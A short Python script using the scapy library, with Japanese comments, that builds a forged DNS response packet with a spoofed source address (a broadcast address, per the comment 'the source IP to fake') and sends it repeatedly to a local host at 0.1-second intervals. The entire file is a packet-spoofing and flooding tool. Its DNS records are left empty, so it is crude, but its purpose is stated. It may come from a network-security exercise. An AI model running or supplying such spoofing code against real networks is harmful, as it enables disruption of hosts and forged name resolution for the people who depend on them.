# -*- coding: utf-8 -*-
from scapy.all import *

#destip=このパケットを送るホストのIPアドレス
destip='192.168.1.3'

#domain_name=名前解決をしたいurl（特に指定なし）
domain_name='www.google.com'

#pkt=パケットの構成
pkt=IP(dst=destip)/UDP(sport=60022)/DNS(qr=1, rd=1,qd=DNSQR(), an=DNSRR())

#source=偽装したい送信元IPアドレス
source='192.168.1.255' 
pkt[IP].src=source

#ループと間隔0.1のループ
srloop(pkt)
srloop(pkt,inter=0.1)
